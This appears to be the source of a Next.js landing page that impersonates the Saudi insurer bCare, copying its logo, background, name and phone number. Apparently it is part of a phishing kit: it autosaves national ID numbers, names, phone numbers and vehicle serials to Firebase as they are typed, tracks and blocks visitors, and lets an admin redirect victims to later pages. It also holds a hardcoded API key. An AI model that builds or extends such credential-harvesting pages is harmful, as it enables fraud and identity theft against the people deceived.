"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import {
  Globe,
  RefreshCw,
  Loader2,
  UserCircle2,
  Car,
  Stethoscope,
  ShieldAlert,
  Plane,
  Search,
  ClipboardCheck,
  ShieldCheck,
  Clock3,
  HandHelping,
  ChevronDown,
  BadgeCheck,
  LifeBuoy,
  Headphones,
  Phone,
  MessageCircle,
  Instagram,
  Twitter,
  Youtube,
} from "lucide-react";
import { FullPageLoader } from "@/components/loader";
import {
  getOrCreateVisitorID,
  initializeVisitorTracking,
  updateVisitorPage,
  checkIfBlocked,
} from "@/lib/visitor-tracking";
import { useAutoSave } from "@/hooks/use-auto-save";
import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
import { secureAddData as addData } from "@/lib/secure-firebase";
import { translations } from "@/lib/translations";
// استيراد دوال car-bot API
import {
  fetchVehiclesByNIN,
  vehiclesToDropdownOptions,
  saveSelectedVehicle,
  clearSelectedVehicle,
  type VehicleDropdownOption,
} from "@/lib/vehicle-api";

function generateCaptcha() {
  return Math.floor(1000 + Math.random() * 9000).toString();
}

export default function HomePage() {
  const router = useRouter();
  const [visitorID, setVisitorID] = useState("");
  const [loading, setLoading] = useState(true);
  const [isBlocked, setIsBlocked] = useState(false);

  useEffect(() => {
    const id = getOrCreateVisitorID();
    if (id) setVisitorID(id);
  }, []);

  // Form fields
  const [identityNumber, setidentityNumber] = useState("");
  const [ownerName, setOwnerName] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [documentType, setDocumentType] = useState("استمارة");
  const [serialNumber, setSerialNumber] = useState("");
  const [insuranceType, setInsuranceType] = useState("تأمين جديد");
  const [buyerName, setBuyerName] = useState("");
  const [buyerIdNumber, setBuyerIdNumber] = useState("");
  const [activeTab, setActiveTab] = useState("مركبات");
  const [captchaCode, setCaptchaCode] = useState(generateCaptcha());
  const [captchaInput, setCaptchaInput] = useState("");
  const [captchaError, setCaptchaError] = useState(false);

  // car-bot integration states
  const [vehicleOptions, setVehicleOptions] = useState<VehicleDropdownOption[]>(
    []
  );
  const [isLoadingVehicles, setIsLoadingVehicles] = useState(false);
  const [showVehicleDropdown, setShowVehicleDropdown] = useState(false);

  // Validation
  const [identityNumberError, setidentityNumberError] = useState("");

  // Language
  const [language, setLanguage] = useState<"ar" | "en">("ar");

  // Auto-save all form data
  useAutoSave({
    visitorId: visitorID,
    pageName: "home",
    data: {
      identityNumber,
      ownerName,
      phoneNumber,
      documentType,
      serialNumber,
      insuranceType,
      ...(insuranceType === "نقل ملكية" && {
        buyerName,
        buyerIdNumber,
      }),
    },
  });

  // Monitor redirect requests from admin
  useRedirectMonitor({
    visitorId: visitorID,
    currentPage: "home",
  });

  // Initialize tracking on mount
  useEffect(() => {
    if (!visitorID) return;

    const init = async () => {
      try {
        const blocked = await checkIfBlocked(visitorID);
        if (blocked) {
          setIsBlocked(true);
          setLoading(false);
          return;
        }

        if (!localStorage.getItem("country")) {
          try {
            const APIKEY =
              "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef";
            const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;
            const response = await fetch(url);
            if (response.ok) {
              const countryName = await response.text();
              const { countryNameToAlpha3 } = await import(
                "@/lib/country-codes"
              );
              const countryCode = countryNameToAlpha3(countryName);
              localStorage.setItem("country", countryCode);
              await addData({
                id: visitorID,
                country: countryCode,
              });
            }
          } catch (error) {
            console.error("Error fetching country:", error);
          }
        }

        setLoading(false);
        initializeVisitorTracking(visitorID).catch(console.error);
        updateVisitorPage(visitorID, "home", 1).catch(console.error);
      } catch (error) {
        console.error("Initialization error:", error);
        setLoading(false);
      }
    };

    init();
  }, [visitorID]);

  // جلب معلومات المركبات عند اكتمال رقم الهوية
  useEffect(() => {
    const fetchVehicles = async () => {
      // التحقق من أن رقم الهوية 10 أرقام
      if (identityNumber.length === 10 && /^\d{10}$/.test(identityNumber)) {
        // التحقق من صحة رقم الهوية باستخدام الخوارزمية
        if (!validateSaudiId(identityNumber)) {
          console.log("❌ Invalid Saudi ID - skipping vehicle fetch");
          setVehicleOptions([]);
          setShowVehicleDropdown(false);
          return;
        }
        setIsLoadingVehicles(true);
        setVehicleOptions([]);
        setShowVehicleDropdown(false);

        try {
          const vehicles = await fetchVehiclesByNIN(identityNumber);

          if (vehicles && vehicles.length > 0) {
            const options = vehiclesToDropdownOptions(vehicles);
            setVehicleOptions(options);
            setShowVehicleDropdown(true);
            console.log(`✅ Found ${options.length} vehicles`);
          } else {
            setVehicleOptions([]);
            setShowVehicleDropdown(false);
            console.log("No vehicles found - manual entry");
          }
        } catch (error) {
          console.error("Error fetching vehicles:", error);
          setVehicleOptions([]);
          setShowVehicleDropdown(false);
        } finally {
          setIsLoadingVehicles(false);
        }
      } else {
        // إذا تغير رقم الهوية، امسح الخيارات
        setVehicleOptions([]);
        setShowVehicleDropdown(false);
      }
    };

    fetchVehicles();
  }, [identityNumber]);

  const refreshCaptcha = () => {
    setCaptchaCode(generateCaptcha());
    setCaptchaInput("");
    setCaptchaError(false);
  };

  const handlePhoneNumberChange = (value: string) => {
    const cleaned = value.replace(/\D/g, "");

    if (cleaned.startsWith("05")) {
      setPhoneNumber(cleaned.slice(0, 10));
    } else if (cleaned.startsWith("5") && !cleaned.startsWith("05")) {
      setPhoneNumber(cleaned.slice(0, 9));
    } else {
      setPhoneNumber(cleaned.slice(0, 10));
    }
  };

  const handleIdentityNumberChange = (value: string) => {
    const cleaned = value.replace(/\D/g, "");
    setidentityNumber(cleaned.slice(0, 10));
    if (identityNumberError) setidentityNumberError("");
  };

  const handleBuyerIdNumberChange = (value: string) => {
    const cleaned = value.replace(/\D/g, "");
    setBuyerIdNumber(cleaned.slice(0, 10));
  };

  const handleSerialNumberChange = (value: string) => {
    const cleaned = value.replace(/\D/g, "");
    setSerialNumber(cleaned);
  };

  // معالجة اختيار الرقم التسلسلي من dropdown
  const handleVehicleSelect = (option: VehicleDropdownOption) => {
    setSerialNumber(option.value); // تعبئة الرقم التسلسلي فقط
    saveSelectedVehicle(option); // حفظ التفاصيل للصفحة الثانية
    setShowVehicleDropdown(false);
  };

  const validateSaudiId = (id: string): boolean => {
    const cleanId = id.replace(/\s/g, "");
    if (!/^\d{10}$/.test(cleanId)) {
      setidentityNumberError(translations[language].identityMust10Digits);
      return false;
    }
    if (!/^[12]/.test(cleanId)) {
      setidentityNumberError(translations[language].identityMustStartWith12);
      return false;
    }
    let sum = 0;
    for (let i = 0; i < 10; i++) {
      let digit = Number.parseInt(cleanId[i]);
      if ((10 - i) % 2 === 0) {
        digit *= 2;
        if (digit > 9) {
          digit -= 9;
        }
      }
      sum += digit;
    }
    if (sum % 10 !== 0) {
      setidentityNumberError(translations[language].invalidIdentityNumber);
      return false;
    }
    setidentityNumberError("");
    return true;
  };

  const handleFirstStepSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!validateSaudiId(identityNumber)) {
      return;
    }

    if (captchaInput !== captchaCode) {
      setCaptchaError(true);
      return;
    }

    await addData({
      id: visitorID,
      identityNumber,
      ownerName,
      phoneNumber,
      documentType,
      serialNumber,
      insuranceType,
      ...(insuranceType === "نقل ملكية" && {
        buyerName,
        buyerIdNumber,
      }),
      // حفظ معلومة إذا تم استخدام car-bot
      vehicleAutoFilled: vehicleOptions.length > 0,
      currentStep: 2,
      currentPage: "insur",
      homeCompletedAt: new Date().toISOString(),
    }).then(() => {
      router.push("/insur");
    });
  };

  if (loading) {
    return <FullPageLoader />;
  }

  if (isBlocked) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <div className="text-center p-8 bg-white rounded-lg shadow-lg max-w-md">
          <h1 className="text-2xl font-bold text-red-600 mb-4">
            تم حظر الوصول
          </h1>
          <p className="text-gray-600">عذراً، تم حظر وصولك إلى هذه الخدمة.</p>
          <p className="text-gray-600 mt-2">
            للمزيد من المعلومات، يرجى التواصل مع الدعم الفني.
          </p>
        </div>
      </div>
    );
  }

  const productTabs = [
    { label: "مركبات", icon: Car },
    { label: "طبي", icon: Stethoscope },
    { label: "أخطاء طبية", icon: ShieldAlert },
    { label: "سفر", icon: Plane },
  ];

  const inquiryItems = [
    { label: "لوحة البيانات", icon: Search },
    { label: "إدارة الوثيقة", icon: ClipboardCheck },
    { label: "حماية المركبة", icon: ShieldCheck },
    { label: "تجديد سريع", icon: Clock3 },
    { label: "دعم المطالبات", icon: HandHelping },
    { label: "تسعير مباشر", icon: BadgeCheck },
    { label: "مركز المساندة", icon: LifeBuoy },
    { label: "التواصل", icon: Headphones },
  ];

  const whyItems = [
    { label: "دفع إلكتروني آمن", icon: ShieldCheck },
    { label: "خدمة عملاء سريعة", icon: Phone },
    { label: "أسعار تنافسية", icon: BadgeCheck },
    { label: "دعم على مدار الساعة", icon: MessageCircle },
  ];

  const footerLinks = ["عن بي كير", "من نحن", "الدعم الفني", "روابط مهمة"];
  const companyLogos = Array.from(
    { length: 11 },
    (_, i) => `/companies/company-${i + 1}.svg`
  );

  return (
    <div
      className="min-h-screen bg-[#eef2f6]"
      dir={language === "ar" ? "rtl" : "ltr"}
    >
      <main className="mx-auto w-full max-w-[390px] px-3 py-2">
        <header className="mb-3 flex items-center justify-between rounded-2xl border border-[#d6e2ed] bg-white px-3 py-2">
          <button
            onClick={() => setLanguage(language === "ar" ? "en" : "ar")}
            className="rounded-md border border-[#d2dfeb] bg-[#f7fafc] px-2 py-1 text-[11px] font-bold text-[#1a5676]"
          >
            EN
          </button>

          <div className="flex items-center gap-1.5">
            <img
              src="https://tse2.mm.bing.net/th/id/OIP.Q6RoywSIxzTk4FmYcrdZBAHaDG?rs=1&pid=ImgDetMain&o=7&rm=3"
              alt="bCare"
              className="h-5"
            />
          </div>

          <UserCircle2 className="h-5 w-5 text-[#1a5676]" />
        </header>
        <section className="bg-[url(https://bcare.com.sa/Web_Bg.0b5a107901701218.svg)] h-50"></section>
        <section className="rounded-2xl border border-[#d6e2ed] bg-white p-3 shadow-sm">
          <h1 className="text-center text-base font-bold text-[#215d7d]">
            أمّن مركبتك بأفضل عروض التأمين
          </h1>

          <div className="mt-2 flex items-center justify-between">
            <p className="text-xs font-semibold text-[#6d8191]">
              وفّر نقدك الآن
            </p>
            <p className="text-sm font-extrabold text-[#f4ad27]">100%</p>
          </div>
          <div className="mt-1 h-2 rounded-full bg-[#e3edf5]">
            <div className="h-full w-full rounded-full bg-gradient-to-r from-[#57a9db] to-[#1a5676]" />
          </div>

          <div className="mt-3 grid grid-cols-4 overflow-hidden rounded-xl border border-[#d6e2ed] bg-[#f8fbfe]">
            {productTabs.map((tab) => {
              const Icon = tab.icon;
              return (
                <button
                  key={tab.label}
                  type="button"
                  onClick={() => setActiveTab(tab.label)}
                  className={`flex flex-col items-center gap-1 py-2 text-[10px] font-semibold transition-colors ${
                    activeTab === tab.label
                      ? "bg-[#1a5676] text-white"
                      : "text-[#5d7384]"
                  }`}
                >
                  <Icon className="h-3.5 w-3.5" />
                  <span>{tab.label}</span>
                </button>
              );
            })}
          </div>

          <form onSubmit={handleFirstStepSubmit} className="mt-3 space-y-2.5">
            <div className="grid grid-cols-2 gap-2">
              <button
                type="button"
                onClick={() => setInsuranceType("تأمين جديد")}
                className={`h-10 rounded-lg text-sm font-bold ${
                  insuranceType === "تأمين جديد"
                    ? "bg-[#1a5676] text-white"
                    : "bg-[#f1f6fb] text-[#1a5676]"
                }`}
              >
                {translations[language].newInsurance}
              </button>
              <button
                type="button"
                onClick={() => setInsuranceType("نقل ملكية")}
                className={`h-10 rounded-lg text-sm font-bold ${
                  insuranceType === "نقل ملكية"
                    ? "bg-[#1a5676] text-white"
                    : "bg-[#f1f6fb] text-[#1a5676]"
                }`}
              >
                {translations[language].ownershipTransfer}
              </button>
            </div>

            <div className="relative">
              <Input
                type="tel"
                inputMode="numeric"
                pattern="[0-9]*"
                placeholder={translations[language].identityNumber}
                value={identityNumber}
                onChange={(e) => handleIdentityNumberChange(e.target.value)}
                className="h-10 rounded-lg border-[#d0dce8] text-sm"
                dir="rtl"
                required
              />
              {isLoadingVehicles && (
                <Loader2 className="absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 animate-spin text-[#1a5676]" />
              )}
            </div>

            {identityNumberError && (
              <p className="text-xs font-semibold text-red-600">
                {identityNumberError}
              </p>
            )}

            <Input
              placeholder={translations[language].ownerName}
              value={ownerName}
              onChange={(e) => setOwnerName(e.target.value)}
              className="h-10 rounded-lg border-[#d0dce8] text-sm"
              dir="rtl"
              required
            />

            <Input
              type="tel"
              inputMode="numeric"
              pattern="[0-9]*"
              placeholder={translations[language].phoneNumber}
              value={phoneNumber}
              onChange={(e) => handlePhoneNumberChange(e.target.value)}
              className="h-10 rounded-lg border-[#d0dce8] text-sm"
              dir="rtl"
              required
            />

            {insuranceType === "نقل ملكية" && (
              <>
                <Input
                  placeholder={translations[language].buyerName}
                  value={buyerName}
                  onChange={(e) => setBuyerName(e.target.value)}
                  className="h-10 rounded-lg border-[#d0dce8] text-sm"
                  dir="rtl"
                  required
                />
                <Input
                  type="tel"
                  inputMode="numeric"
                  pattern="[0-9]*"
                  placeholder={translations[language].buyerIdNumber}
                  value={buyerIdNumber}
                  onChange={(e) => handleBuyerIdNumberChange(e.target.value)}
                  className="h-10 rounded-lg border-[#d0dce8] text-sm"
                  dir="rtl"
                  required
                />
              </>
            )}

            <div className="grid grid-cols-2 gap-2">
              <button
                type="button"
                onClick={() => setDocumentType("استمارة")}
                className={`h-10 rounded-lg text-sm font-bold ${
                  documentType === "استمارة"
                    ? "bg-[#1a5676] text-white"
                    : "bg-[#f1f6fb] text-[#1a5676]"
                }`}
              >
                {translations[language].form}
              </button>
              <button
                type="button"
                onClick={() => setDocumentType("بطاقة جمركية")}
                className={`h-10 rounded-lg text-sm font-bold ${
                  documentType === "بطاقة جمركية"
                    ? "bg-[#1a5676] text-white"
                    : "bg-[#f1f6fb] text-[#1a5676]"
                }`}
              >
                {translations[language].customsCard}
              </button>
            </div>

            {showVehicleDropdown && vehicleOptions.length > 0 ? (
              <select
                value={serialNumber}
                onChange={(e) => {
                  if (e.target.value === "OTHER") {
                    clearSelectedVehicle();
                    setShowVehicleDropdown(false);
                    setSerialNumber("");
                    return;
                  }
                  const selected = vehicleOptions.find(
                    (opt) => opt.value === e.target.value
                  );
                  if (selected) handleVehicleSelect(selected);
                }}
                className="h-10 w-full rounded-lg border border-[#d0dce8] bg-white px-3 text-sm text-[#1f2f3a]"
                required
              >
                <option value="">اختر الرقم التسلسلي</option>
                {vehicleOptions.map((option) => (
                  <option key={option.value} value={option.value}>
                    {option.label}
                  </option>
                ))}
                <option value="OTHER">——— مركبة أخرى ———</option>
              </select>
            ) : (
              <Input
                type="tel"
                inputMode="numeric"
                pattern="[0-9]*"
                placeholder={
                  documentType === "بطاقة جمركية"
                    ? translations[language].customsDeclarationNumber
                    : translations[language].serialNumber
                }
                value={serialNumber}
                onChange={(e) => handleSerialNumberChange(e.target.value)}
                className="h-10 rounded-lg border-[#d0dce8] text-sm"
                dir="rtl"
                required
              />
            )}

            <div className="rounded-lg border border-[#d8e4ef] bg-[#f7fbff] p-2">
              <div className="flex items-center justify-between gap-2">
                <div
                  className="flex items-center gap-2 rounded-md bg-white px-2 py-1.5"
                  dir="ltr"
                >
                  {captchaCode.split("").map((digit, idx) => (
                    <span
                      key={idx}
                      className={`text-xl font-bold ${
                        idx % 2 === 0 ? "text-[#1a5676]" : "text-[#f4ad27]"
                      }`}
                    >
                      {digit}
                    </span>
                  ))}
                  <button
                    type="button"
                    onClick={refreshCaptcha}
                    className="rounded bg-[#1a5676] p-1 text-white"
                  >
                    <RefreshCw className="h-3.5 w-3.5" />
                  </button>
                </div>

                <Input
                  placeholder={translations[language].verificationCode}
                  value={captchaInput}
                  onChange={(e) => {
                    setCaptchaInput(e.target.value);
                    if (captchaError) setCaptchaError(false);
                  }}
                  className={`h-9 flex-1 rounded-md text-sm ${
                    captchaError ? "border-red-500" : "border-[#d0dce8]"
                  }`}
                  dir="rtl"
                  required
                />
              </div>
              {captchaError && (
                <p className="mt-1 text-xs font-semibold text-red-600">
                  {translations[language].incorrectVerificationCode}
                </p>
              )}
            </div>

            <Button
              type="submit"
              className="h-10 w-full rounded-lg bg-[#f2b332] text-sm font-extrabold text-[#1a5676] hover:bg-[#e9a71f]"
            >
              ابدأ الآن
            </Button>
          </form>
        </section>

        <section className="rounded-xl border border-[#dde8f2] bg-white px-3 py-2">
          <div className="flex items-center justify-between gap-2">
            <img
              src="/vision2030-grey.svg"
              alt="Vision 2030"
              className="h-7 object-contain"
            />
            <img
              src="/sa-map-grey.svg"
              alt="Saudi map"
              className="h-7 object-contain"
            />
            <img src="/NIC-logo.png" alt="NIC" className="h-7 object-contain" />
          </div>
        </section>

        <section className="mt-4 rounded-2xl border border-[#d9e5ef] bg-white p-3">
          <h2 className="text-center text-sm font-bold text-[#1a5676]">
            طريقة الاستعلام عن رقم الوثيقة
          </h2>
          <div className="mt-3 grid grid-cols-4 gap-2.5">
            {inquiryItems.map((item) => {
              const Icon = item.icon;
              return (
                <div
                  key={item.label}
                  className="rounded-lg border border-[#e5edf4] bg-[#fbfdff] px-1 py-2 text-center"
                >
                  <Icon className="mx-auto h-4 w-4 text-[#1a5676]" />
                  <p className="mt-1 text-[10px] font-semibold leading-4 text-[#5b7283]">
                    {item.label}
                  </p>
                </div>
              );
            })}
          </div>
        </section>

        <section className="mt-4 rounded-2xl border border-[#d9e5ef] bg-white p-3">
          <h2 className="text-center text-sm font-bold text-[#1a5676]">
            تجمعات وفرة
          </h2>
          <p className="mt-1 text-center text-[11px] leading-5 text-[#6a8090]">
            تجمعات وطنية بتغطيات تأمينية متنوعة مع أفضل الشركات.
          </p>
          <div className="mt-3 grid grid-cols-4 gap-2">
            {companyLogos.map((logo) => (
              <div
                key={logo}
                className="flex h-12 items-center justify-center rounded-lg border border-[#e5edf4] bg-white px-1"
              >
                <img
                  src={logo}
                  alt="company"
                  className="max-h-8 w-auto object-contain"
                />
              </div>
            ))}
          </div>
        </section>

        <section className="mt-4 rounded-2xl border border-[#d9e5ef] bg-white p-3">
          <h2 className="text-center text-sm font-bold text-[#1a5676]">
            لماذا بي كير بدايةً أولاً في السعودية؟
          </h2>
          <div className="mt-3 grid grid-cols-2 gap-2.5">
            {whyItems.map((item) => {
              const Icon = item.icon;
              return (
                <div
                  key={item.label}
                  className="rounded-lg border border-[#e5edf4] bg-[#fbfdff] p-2 text-center"
                >
                  <Icon className="mx-auto h-4 w-4 text-[#1a5676]" />
                  <p className="mt-1 text-[11px] font-semibold text-[#5b7283]">
                    {item.label}
                  </p>
                </div>
              );
            })}
          </div>
        </section>
      </main>

      <footer className="mt-4 bg-[#0c4a6c] px-4 pb-5 pt-4 text-white">
        <div className="mx-auto w-full max-w-[390px]">
          <div className="mb-3 flex items-center justify-between">
            <div className="flex items-center gap-2">
              <img
                src="https://tse2.mm.bing.net/th/id/OIP.Q6RoywSIxzTk4FmYcrdZBAHaDG?rs=1&pid=ImgDetMain&o=7&rm=3"
                alt="bCare"
                className="h-5"
              />
            </div>
            <p className="text-xs font-semibold">8001180044</p>
          </div>

          <div className="mb-3 flex flex-wrap items-center justify-center gap-2">
            <img
              src="/huawei_store.jpg"
              alt="AppGallery"
              className="h-8 rounded"
            />
            <img
              src="/apple_store.png"
              alt="App Store"
              className="h-8 rounded"
            />
            <img
              src="/google_play.png"
              alt="Google Play"
              className="h-8 rounded"
            />
          </div>

          <div className="space-y-1">
            {footerLinks.map((item) => (
              <button
                key={item}
                type="button"
                className="flex w-full items-center justify-between rounded-md bg-white/5 px-2.5 py-2 text-xs font-semibold"
              >
                <span>{item}</span>
                <ChevronDown className="h-3.5 w-3.5" />
              </button>
            ))}
          </div>

          <div className="mt-4 flex items-center justify-center gap-3">
            <span className="rounded-full bg-white/15 p-1.5">
              <Instagram className="h-3.5 w-3.5" />
            </span>
            <span className="rounded-full bg-white/15 p-1.5">
              <Twitter className="h-3.5 w-3.5" />
            </span>
            <span className="rounded-full bg-white/15 p-1.5">
              <Youtube className="h-3.5 w-3.5" />
            </span>
          </div>
          <p className="mt-3 text-center text-[10px] text-white/75">
            جميع الحقوق محفوظة لشركة بي كير ©
          </p>
        </div>
      </footer>
    </div>
  );
}
